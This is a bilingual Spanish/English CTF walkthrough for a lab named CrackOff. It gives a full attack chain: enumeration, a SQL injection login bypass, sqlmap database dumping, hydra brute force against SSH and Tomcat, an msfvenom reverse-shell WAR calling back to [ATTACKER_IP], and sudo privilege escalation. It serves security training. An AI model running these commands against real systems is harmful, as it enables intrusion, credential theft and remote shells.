# QuickStart - CrackOff CTF Resolution Guide

## Guía Rápida de Resolución | Quick Resolution Guide

---

## Español

### Pasos Críticos para Resolver el Laboratorio

#### 1. Enumeración Inicial
```bash
nmap -p- [TARGET_IP]
gobuster dir -u http://[TARGET_IP] -w [WORDLIST]
```

#### 2. SQL Injection
- Acceder a `http://[TARGET_IP]/login.php`
- Inyectar payload SQLi: `admin' OR '1'='1`
- Alternativamente, usar sqlmap:
```bash
sqlmap -u "http://[TARGET_IP]/login.php" --dbs
sqlmap -u "http://[TARGET_IP]/login.php" -D crackoff_db --tables
sqlmap -u "http://[TARGET_IP]/login.php" -D crackoff_db -T users --dump
```

#### 3. Ataque SSH con Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://[TARGET_IP] -t 4
```
Obtener acceso como usuario `rosa`

#### 4. Descubrimiento de Tomcat
```bash
ssh rosa@[TARGET_IP]
netstat -ano | grep LISTEN  # Identificar localhost:8080
```

#### 5. Port Forwarding
```bash
ssh -L 8080:localhost:8080 rosa@[TARGET_IP]
```

#### 6. Tomcat Manager
- Atacar el servicio con hydra:
```bash
hydra -L users.txt -P passwords.txt http-basic://localhost:8080/manager/html -t 4
```
- Crear payload con msfvenom:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4443 -f war -o shell.war
```
- Cargar el archivo `.war` al manager y ejecutar
- Escuchar con netcat:
```bash
nc -lnvp 4443
```

#### 7. Escalada de Privilegios
```bash
sudo -l  # Verificar permisos
# Modificar /usr/bin/catalina.sh para obtener shell como root
sudo /usr/bin/catalina.sh
```

#### 8. Acceso Adicional (Bonus)
```bash
# Conectar como mario
ssh mario@[TARGET_IP]
# Conectar como alice (usar credenciales del archivo note.txt en Keepass2)
ssh alice@[TARGET_IP]
```

---

## English

### Critical Steps to Resolve the Laboratory

#### 1. Initial Enumeration
```bash
nmap -p- [TARGET_IP]
gobuster dir -u http://[TARGET_IP] -w [WORDLIST]
```

#### 2. SQL Injection
- Access `http://[TARGET_IP]/login.php`
- Inject SQLi payload: `admin' OR '1'='1`
- Alternatively, use sqlmap:
```bash
sqlmap -u "http://[TARGET_IP]/login.php" --dbs
sqlmap -u "http://[TARGET_IP]/login.php" -D crackoff_db --tables
sqlmap -u "http://[TARGET_IP]/login.php" -D crackoff_db -T users --dump
```

#### 3. SSH Brute-Force Attack with Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://[TARGET_IP] -t 4
```
Obtain access as user `rosa`

#### 4. Tomcat Service Discovery
```bash
ssh rosa@[TARGET_IP]
netstat -ano | grep LISTEN  # Identify localhost:8080
```

#### 5. Port Forwarding
```bash
ssh -L 8080:localhost:8080 rosa@[TARGET_IP]
```

#### 6. Tomcat Manager
- Attack the service with hydra:
```bash
hydra -L users.txt -P passwords.txt http-basic://localhost:8080/manager/html -t 4
```
- Create payload with msfvenom:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4443 -f war -o shell.war
```
- Upload the `.war` file to the manager and execute
- Listen with netcat:
```bash
nc -lnvp 4443
```

#### 7. Privilege Escalation
```bash
sudo -l  # Verify permissions
# Modify /usr/bin/catalina.sh to obtain shell as root
sudo /usr/bin/catalina.sh
```

#### 8. Additional Access (Bonus)
```bash
# Connect as mario
ssh mario@[TARGET_IP]
# Connect as alice (use credentials from note.txt file in Keepass2)
ssh alice@[TARGET_IP]
```

---

## Resumen de Herramientas Utilizadas | Tools Used

| Herramienta | Propósito | Tool | Purpose |
|---|---|---|---|
| nmap | Escaneo de puertos | Port scanning |
| gobuster | Enumeración web | Web enumeration |
| sqlmap | Explotación de SQLi | SQLi exploitation |
| hydra | Ataques de fuerza bruta | Brute-force attacks |
| msfvenom | Creación de payloads | Payload generation |
| netcat | Reverse shell | Reverse shell listener |
| scp | Transferencia de archivos | File transfer |
| Keepass2 | Gestión de contraseñas | Password management |

---

## Notas Importantes | Important Notes

- **Español:** El laboratorio está diseñado para enseñar múltiples vectores de ataque encadenados. Cada fase construye sobre la anterior, progresando desde reconocimiento hasta escalada de privilegios.

- **English:** The laboratory is designed to teach multiple chained attack vectors. Each phase builds on the previous one, progressing from reconnaissance to privilege escalation.
